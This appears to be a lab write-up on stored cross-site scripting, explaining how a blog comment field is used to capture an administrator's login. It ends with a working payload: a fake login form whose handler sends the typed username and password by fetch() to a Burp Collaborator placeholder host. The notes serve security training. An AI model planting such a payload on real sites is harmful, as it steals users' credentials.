**XSS**
- In Cross Site Scripting or *code injection*, malicious JavaScript payload is injected across different code sites within the same website. 
- As the attack targets the user's browser session, it is client side instead of server side.

**Point of Entry**
- Admin looks at all blogpost comments.
- Blogpost comment function is point of entry to exfiltrate admin username and password.

**Barrier to entry** 
- Only own login details can be viewed in Burpsuite HTTP history.

**Bypassing Barrier to Entry**
- Using Collaborator to create payload for monitoring administrator's POST request.
- Enter created payload in template exploit and post as a comment on a chosen blogpost. 
- Visiting chosen blogpost will reveal the administrator's login details in Collaborator.

`<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
